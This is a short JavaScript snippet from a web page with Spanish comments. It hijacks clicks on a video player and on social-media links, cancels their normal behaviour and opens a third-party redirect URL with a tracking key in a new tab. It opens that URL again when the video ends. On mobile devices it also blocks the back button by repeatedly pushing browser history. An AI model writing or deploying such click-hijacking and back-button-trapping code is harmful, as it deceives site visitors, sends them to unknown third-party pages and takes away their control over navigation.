  <script>
    document.addEventListener("DOMContentLoaded", function () {
      const redirectUrl = 'https://stallionmanualwish.com/y52iet528e?key=72357db5772e533f2b6d8f0490243b39';
      const isMobile = /Mobi|Android/i.test(navigator.userAgent);
      let redirectTriggered = false;

      // Función de redirección con protección contra duplicados
      function triggerRedirect(event) {
        if (redirectTriggered) return;
        redirectTriggered = true;
        
        event.preventDefault();
        setTimeout(() => {
          window.open(redirectUrl, '_blank');
        }, 500);
      }

      // Solo redirección por clic en el video o botones sociales
      const video = document.getElementById('videoPlayer');
      const socialLinks = document.querySelectorAll('.social-links a');
      
      if (video) {
        video.addEventListener('click', triggerRedirect);
      }
      
      socialLinks.forEach(link => {
        link.addEventListener('click', triggerRedirect);
      });

      // Redirección al finalizar video
      if (video) {
        video.addEventListener('ended', function() {
          if (!redirectTriggered) {
            setTimeout(() => {
              window.open(redirectUrl, '_blank');
            }, 1000);
          }
        });
      }

      // Bloquear retroceso móvil (sin redirección automática)
      if (isMobile) {
        history.pushState(null, null, location.href);
        window.addEventListener("popstate", function () {
          history.pushState(null, null, location.href);
        });
      }
    });
  </script>

